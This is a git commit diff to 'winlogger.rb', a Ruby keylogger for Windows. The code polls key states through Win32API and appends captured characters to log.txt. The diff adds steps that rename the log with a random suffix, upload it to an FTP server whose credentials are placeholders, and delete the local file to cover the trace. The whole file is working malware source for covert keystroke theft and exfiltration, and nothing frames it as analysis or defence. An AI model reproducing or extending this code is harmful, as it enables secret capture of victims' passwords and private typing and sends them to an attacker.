44dca324a4d958186a059145d68647258145f26d
Luka Miletic <112261868+mileticluka1@users.noreply.github.com>
2022-10-31 12:34:32 -0700

    Update winlogger.rb

--- winlogger.rb
+++ winlogger.rb
@@ -1,19 +1,27 @@
 #!usr/bin/ruby
 
+require 'securerandom'
 require 'net/ftp'
 require 'open-uri'
-require 'Win32API'
- 
-Net::FTP.open('ftp server', 'ftp username', 'ftp password') do |ftp|
+require 'win32api'
+
+full = "log.txt"
+nameofile = "log"
+extension = ".txt"
+quote = '"'
+s = SecureRandom.hex
+new = nameofile + "_" + s + extension
+
+if File.file?(nameofile + extension) == true
+  File.rename(full, new)
+end
+
+Net::FTP.open('FTP server', 'FTP username', 'FTP password') do |ftp|
   ftp.passive = true
-  ftp.putbinaryfile("log.txt")
+  ftp.putbinaryfile(new)
 end
 
-def reseter
-  File.delete("log.txt")
-end
-
-reseter
+puts File.delete(new)
 
 def savefile(filename,text)
 files = File.open(filename,'a')
@@ -32,7 +40,7 @@ savefile("log.txt",num1.chr())
 end
 end
  
-for num2 in (0x41..0x5A)
+for num2 in (0x41..0x5A) #letters
 if nave.call(num2) & 0x01 == 1 
 savefile("log.txt",num2.chr())
 end
